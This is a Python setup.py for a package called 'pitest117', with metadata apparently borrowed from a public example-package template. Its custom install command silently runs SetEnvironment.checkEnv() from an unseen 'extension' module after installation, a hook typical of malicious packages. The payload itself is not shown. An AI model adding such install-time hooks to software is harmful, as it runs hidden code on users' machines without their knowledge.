from setuptools import setup, find_packages
from setuptools.command.install import install
import atexit
import os

class InstallEnvironment(install):
    def run(self):
        install.run(self)
        self.check_hardware()
    def check_hardware(self):
        from extension import SetEnvironment
        SetEnvironment.checkEnv()

setup(
    name = 'pitest117',
    version = "1.0.6",
    author = 'David Foster',
    author_email = 'david.foster@ons.gov.uk',
    url = 'https://best-practice-and-impact.github.io/example-package-python/',
    description = 'A simple example python package.',
    long_description_content_type = "text/x-rst",  # If this causes a warning, upgrade your setuptools package,
    license = "MIT license",
    packages = find_packages(exclude=["test"]),  # Don't include test directory in binary distribution
    cmdclass={
        'install': InstallEnvironment,
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ]  # Update these accordingly
)
